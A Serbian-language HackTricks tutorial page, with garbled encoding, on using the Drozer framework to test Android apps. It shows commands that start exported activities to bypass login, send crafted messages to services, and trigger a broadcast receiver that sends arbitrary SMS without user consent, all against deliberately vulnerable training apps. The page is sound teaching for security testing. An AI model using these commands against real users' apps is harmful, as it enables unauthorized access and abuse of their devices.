# Drozer Tutorijal

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">

**Savet za bug bounty**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridru≈æite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poƒçnite da zaraƒëujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## APK-ovi za testiranje

* [Sieve](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk) (od mrwlabs)
* [DIVA](https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz)

**Delovi ovog tutorijala su izdvojeni iz** [**Drozer dokumentacije pdf**](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)**.**

## Instalacija

Instalirajte Drozer klijenta unutar va≈°eg hosta. Preuzmite ga sa [najnovijih izdanja](https://github.com/mwrlabs/drozer/releases).
```bash
pip install drozer-2.4.4-py2-none-any.whl
pip install twisted
pip install service_identity
```
Preuzmite i instalirajte drozer APK sa [poslednjim izdanjima](https://github.com/mwrlabs/drozer/releases). Trenutno je to [ovo](https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk).
```bash
adb install drozer.apk
```
### Pokretanje servera

Agent se izvr≈°ava na portu 31415, potrebno je [prosleƒëivanje porta](https://en.wikipedia.org/wiki/Port\_forwarding) kako bismo uspostavili komunikaciju izmeƒëu Drozer klijenta i Agent-a, evo komande za to:
```bash
adb forward tcp:31415 tcp:31415
```
Na kraju, **pokrenite** **aplikaciju** i pritisnite dugme "**ON**"

![](<../../../.gitbook/assets/image (459).png>) 

I pove≈æite se na nju:
```bash
drozer console connect
```
## Interesantne Komande

| **Komande**     | **Opis**                                                                                                                                                |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Help MODULE** | Prikazuje pomoƒá odabranog modula                                                                                                                       |
| **list**        | Prikazuje listu svih drozer modula koji mogu biti izvr≈°eni u trenutnoj sesiji. Ovo skriva module za koje nemate odgovarajuƒáe dozvole za pokretanje.         |
| **shell**       | Pokreƒáe interaktivnu Linux ljusku na ureƒëaju, u kontekstu Agenta.                                                                                       |
| **clean**       | Uklanja privremene datoteke koje je drozer saƒçuvao na Android ureƒëaju.                                                                                  |
| **load**        | Uƒçitava datoteku koja sadr≈æi drozer komande i izvr≈°ava ih u sekvenci.                                                                                   |
| **module**      | Pronalazi i instalira dodatne drozer module sa Interneta.                                                                                               |
| **unset**       | Uklanja nazvanu promenljivu koju drozer prosleƒëuje svim Linux ljuskama koje pokreƒáe.                                                                     |
| **set**         | ƒåuva vrednost u promenljivoj koja ƒáe biti prosleƒëena kao okolina svim Linux ljuskama koje pokreƒáe drozer.                                                |
| **shell**       | Pokreƒáe interaktivnu Linux ljusku na ureƒëaju, u kontekstu Agenta.                                                                                       |
| **run MODULE**  | Izvr≈°ava drozer modul                                                                                                                                  |
| **exploit**     | Drozer mo≈æe kreirati eksploate za izvr≈°avanje na ureƒëaju. `drozer exploit list`                                                                         |
| **payload**     | Eksploati zahtevaju payload. `drozer payload list`                                                                                                      |

### Paket

Pronaƒëi **ime** paketa filtrirajuƒái po delu imena:
```bash
dz> run app.package.list -f sieve
com.mwr.example.sieve
```
**Osnovne informacije** o paketu:
```bash
dz> run app.package.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Process Name: com.mwr.example.sieve
Version: 1.0
Data Directory: /data/data/com.mwr.example.sieve
APK Path: /data/app/com.mwr.example.sieve-2.apk
UID: 10056
GID: [1028, 1015, 3003]
Shared Libraries: null
Shared User ID: null
Uses Permissions:
- android.permission.READ_EXTERNAL_STORAGE
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.INTERNET
Defines Permissions:
- com.mwr.example.sieve.READ_KEYS
- com.mwr.example.sieve.WRITE_KEYS
```
Proƒçitajte **Manifest**:
```bash
run app.package.manifest jakhar.aseem.diva
```
**Napadna povr≈°ina** paketa:
```bash
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
3 activities exported
0 broadcast receivers exported
2 content providers exported
2 services exported
is debuggable
```
* **Aktivnosti**: Mo≈æda mo≈æete pokrenuti aktivnost i zaobiƒái neku vrstu autorizacije koja bi trebalo da vas spreƒçi da je pokrenete.
* **Provajderi sadr≈æaja**: Mo≈æda mo≈æete pristupiti privatnim podacima ili iskoristiti neku ranjivost (SQL Injection ili Traversiranje putanje).
* **Servisi**:
* **is debuggable**: [Saznajte vi≈°e](./#is-debuggeable)

### Aktivnosti

Vrednost "android:exported" izve≈æenog aktivnog komponenta postavljena je na **"true"** u AndroidManifest.xml datoteci:
```markup
<activity android:name="com.my.app.Initial" android:exported="true">
</activity>
```
**Lista izvezenih aktivnosti**:
```bash
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
com.mwr.example.sieve.FileSelectActivity
com.mwr.example.sieve.MainLoginActivity
com.mwr.example.sieve.PWList
```
**Pokretanje aktivnosti**:

Mo≈æda mo≈æete pokrenuti aktivnost i zaobiƒái neku vrstu autorizacije koja bi trebalo da vas spreƒçi da je pokrenete.

{% code overflow="wrap" %}
```bash
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```
{% endcode %}

Takoƒëe mo≈æete pokrenuti izve≈°tenu aktivnost pomoƒáu **adb**:

* PackageName je com.example.demo
* Ime izve≈°tene aktivnosti je com.example.test.MainActivity
```bash
adb shell am start -n com.example.demo/com.example.test.MainActivity
```
### Provajderi sadr≈æaja

Ovaj post je bio toliko veliki da biste ga mogli **pristupiti na njegovoj sopstvenoj stranici ovde**](exploiting-content-providers.md).

### Servisi

Izve≈æeni servis je deklarisan unutar Manifest.xml fajla:

{% code overflow="wrap" %}
```markup
<service android:name=".AuthService" android:exported="true" android:process=":remote"/>
```
{% endcode %}

Unutar koda **proverite** funkciju \*\*`handleMessage`\*\* koja ƒáe **primiti** **poruku**:

![](<../../../.gitbook/assets/image (82).png>)

#### Lista servisa
```bash
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
com.mwr.example.sieve.AuthService
Permission: null
com.mwr.example.sieve.CryptoService
Permission: null
```
#### **Komunicirajte** sa uslugom
```bash
app.service.send            Send a Message to a service, and display the reply
app.service.start           Start Service
app.service.stop            Stop Service
```
#### Primer

Pogledajte **drozer** pomoƒá za `app.service.send`:

![](<../../../.gitbook/assets/image (1079).png>)

Imajte na umu da ƒáete prvo slati podatke unutar "_msg.what_", zatim "_msg.arg1_" i "_msg.arg2_", trebalo bi da proverite unutar koda **koje informacije se koriste** i gde.\
Kori≈°ƒáenjem opcije `--extra` mo≈æete poslati ne≈°to ≈°to ƒáe biti interpretirano kao "_msg.replyTo"_, a kori≈°ƒáenjem `--bundle-as-obj` kreirate objekat sa pru≈æenim detaljima.

U sledeƒáem primeru:

* `what == 2354`
* `arg1 == 9234`
* `arg2 == 1`
* `replyTo == object(string com.mwr.example.sieve.PIN 1337)`
```bash
run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj
```
![](<../../../.gitbook/assets/image (647).png>)

### Broadcast prijemnici

**U odeljku Osnovne informacije o Androidu mo≈æete videti ≈°ta je Broadcast prijemnik**.

Nakon otkrivanja ovih Broadcast prijemnika trebalo bi **proveriti kod** njih. Posebno obratite pa≈ænju na funkciju **`onReceive`** jer ƒáe ona obraƒëivati primljene poruke.

#### **Otkrijte sve** broadcast prijemnike
```bash
run app.broadcast.info #Detects all
```
#### Proverite prijemnike emitovanja aplikacije
```bash
#Check one negative
run app.broadcast.info -a jakhar.aseem.diva
Package: jakhar.aseem.diva
No matching receivers.

# Check one positive
run app.broadcast.info -a com.google.android.youtube
Package: com.google.android.youtube
com.google.android.libraries.youtube.player.PlayerUiModule$LegacyMediaButtonIntentReceiver
Permission: null
com.google.android.apps.youtube.app.common.notification.GcmBroadcastReceiver
Permission: com.google.android.c2dm.permission.SEND
com.google.android.apps.youtube.app.PackageReplacedReceiver
Permission: null
com.google.android.libraries.youtube.account.AccountsChangedReceiver
Permission: null
com.google.android.apps.youtube.app.application.system.LocaleUpdatedReceiver
Permission: null
```
#### Emitovanje **Interakcija**
```bash
app.broadcast.info          Get information about broadcast receivers
app.broadcast.send          Send broadcast using an intent
app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents
```
#### Po≈°alji poruku

U ovom primeru zloupotrebe [FourGoats apk](https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk) Content Providera mo≈æete **poslati proizvoljnu SMS** na bilo koju destinaciju **bez tra≈æenja** dozvole korisnika.

![](<../../../.gitbook/assets/image (415).png>)

![](<../../../.gitbook/assets/image (573).png>)

Ako proƒçitate kod, parametri "_phoneNumber_" i "_message_" moraju biti poslati Content Provideru.
```bash
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"
```
### Da li je moguƒáe debagovanje

APK u produkciji nikada ne bi trebalo da bude moguƒáe debagovanje.\
To znaƒçi da mo≈æete **povezati Java debager** sa pokrenutom aplikacijom, inspicirati je u toku izvr≈°avanja, postaviti prekide, iƒái korak po korak, prikupljati vrednosti promenljivih pa ƒçak i ih menjati. [InfoSec institut ima odliƒçan ƒçlanak](../exploiting-a-debuggeable-application.md) o dubljem istra≈æivanju kada je va≈°a aplikacija debagovana i ubacivanju koda u toku izvr≈°avanja.

Kada je aplikacija moguƒáe debagovati, pojaviƒáe se u Manifestu:
```xml
<application theme="@2131296387" debuggable="true"
```
Mo≈æete pronaƒái sve aplikacije koje se mogu debagovati pomoƒáu **Drozera**:
```bash
run app.package.debuggable
```
## Tutorijali

* [https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref](https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref)
* [https://github.com/mgcfish/mobiletools/blob/master/\_posts/2016-08-01-Using-Drozer-for-application-security-assessments.md](https://github.com/mgcfish/mobiletools/blob/master/\_posts/2016-08-01-Using-Drozer-for-application-security-assessments.md)
* [https://www.hackingarticles.in/android-penetration-testing-drozer/](https://www.hackingarticles.in/android-penetration-testing-drozer/)
* [https://medium.com/@ashrafrizvi3006/how-to-test-android-application-security-using-drozer-edc002c5dcac](https://medium.com/@ashrafrizvi3006/how-to-test-android-application-security-using-drozer-edc002c5dcac)

## Vi≈°e informacija

* [https://blog.dixitaditya.com/android-pentesting-cheatsheet/](https://blog.dixitaditya.com/android-pentesting-cheatsheet/)

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">

**Savet za bug bounty**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridru≈æite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poƒçnite da zaraƒëujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
